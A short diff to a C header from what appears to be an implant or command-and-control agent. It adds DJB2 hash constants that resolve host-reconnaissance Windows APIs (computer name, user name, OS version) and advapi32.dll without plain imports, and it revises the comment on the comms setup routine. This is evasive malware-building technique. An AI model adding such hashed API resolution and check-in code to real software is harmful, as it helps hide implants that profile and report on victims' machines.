@@ -61,6 +61,16 @@
 #define HASH_FREECTXBUFFER      0xC59177A6  /* "FreeContextBuffer"  */
 #define HASH_APPLYCTRLTOKEN     0x45BBC00D  /* "ApplyControlToken"  */
 
+/* DJB2 hashes for host info gathering APIs */
+#define HASH_GETCOMPUTERNAMEA   0x1F2CBC36  /* "GetComputerNameA"   */
+#define HASH_GETUSERNAMEA       0x4C0087C6  /* "GetUserNameA"       */
+#define HASH_RTLGETVERSION      0x491E967D  /* "RtlGetVersion"      */
+
+/* advapi32.dll hash (may also be defined in sleep.h) */
+#ifndef HASH_ADVAPI32_DLL
+#define HASH_ADVAPI32_DLL       0x67208A49  /* "advapi32.dll"       */
+#endif
+
 /* Winsock constants */
 #define AF_INET                 2
 #define AF_INET6                23
@@ -380,8 +390,8 @@ NTSTATUS comms_http_parse_response(const BYTE *data, DWORD data_len,
 NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx);
 
 /**
- * Initialize comms: resolve APIs, read channel config, generate
- * ephemeral keypair, derive session key, connect, register.
+ * Initialize comms: resolve APIs, read channel config, derive
+ * session key from config keypair, connect, register.
  */
 NTSTATUS comms_init(IMPLANT_CONTEXT *ctx);
 
